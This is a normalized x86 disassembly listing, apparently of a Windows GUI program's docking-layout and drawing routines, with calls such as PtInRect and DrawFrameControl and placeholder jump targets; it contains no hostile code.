mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_425100
mov edx eax
mov eax ebx
call sub_41e620
mov eax [ ebp - 0x4 ]
call sub_446238
xor eax eax
push ebp
push sub_446174
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_445c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44617b
mov eax [ ebp - 0x4 ]
call sub_44623c
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_440954
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44617b
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_44800c
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_4461d0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_44723c
mov eax [ esi + 0x10 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_446250
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_446250
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_446250
pop ecx
sub_4462a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_446250
pop ecx
sub_4462d4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4462d4
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4462d4
pop ecx
sub_446328
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_4462a8
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_445b94
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_445b94
push eax
mov edx 0x1
mov eax ebx
call sub_445b28
push eax
mov edx 0x2
mov eax ebx
call sub_445b28
pop edx
pop ecx
call sub_412cfc
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b40
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4463ac
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_445de4
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412cfc
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ce44
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445a10
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_4462a8
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_445a34
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4472d4
mov edx esi
mov eax ebx
call sub_4462a8
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_43d428
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_445a10
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_43d414
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_445b94
mov edx eax
mov eax edi
call sub_445f84
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_445b94
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_445b94
mov edx eax
mov eax edi
call sub_445f84
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_445b94
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_4465bc
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_446764
jmp r-xdata
sub_4465bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_445a10
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_445f5c
mov edx eax
mov eax ebx
call sub_445f84
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_445f84
mov eax [ esi + 0x64 ]
call sub_445f5c
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44762c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446310
mov eax [ esi + 0x64 ]
call sub_445f5c
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_44762c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446310
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_4479b0
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_446310
mov eax [ esi + 0x64 ]
call sub_445f5c
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_447ae4
xor edx edx
mov eax esi
call sub_446310
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_445f84
adc edx 0x0
mov eax ebx
call sub_445c44
mov eax ebx
call sub_445fd4
push esi
push sub_447ae4
xor edx edx
mov eax esi
call sub_446310
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_446764
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_445c44
mov eax [ ebx + 0x14 ]
call sub_445fd4
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_4467dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_445f5c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_445f5c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_445f5c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_445b28
mov esi eax
mov edx 0x2
mov eax ebx
call sub_445b28
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_445f5c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_446034
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44605c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446034
call sub_4467dc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44605c
call sub_4467dc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_445b94
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_445b94
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_446a08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_440990
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_412cac
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446a9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_446a08
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44605c
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4462a8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_44605c
call sub_4467dc
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_446b24
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403ef8
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404544
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_446b6c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_446d64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_44723c
mov eax [ ebp - 0x8 ]
call sub_446238
xor edx edx
push ebp
push sub_446d47
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446d4e
mov eax [ ebp - 0x8 ]
call sub_44623c
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_445a10
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_446b24
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403320
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_445d30
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_446b24
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_43d3a4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_43e178
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403124
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_446d74
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412cd4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ed94
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_446dcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41e36c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41eac8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41ea68
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41ea68
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41e36c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41ea68
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ea68
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_446e54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_446d74
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_446dcc
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_446dcc
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_446d74
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_446dcc
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_446dcc
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_446f30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447086
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43c060
mov eax [ ebp - 0x4 ]
call sub_41eaa0
xor eax eax
push ebp
push sub_447069
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ee14
xor eax eax
push ebp
push sub_44704c
push [ fs : eax ]
mov [ fs : eax ] esp
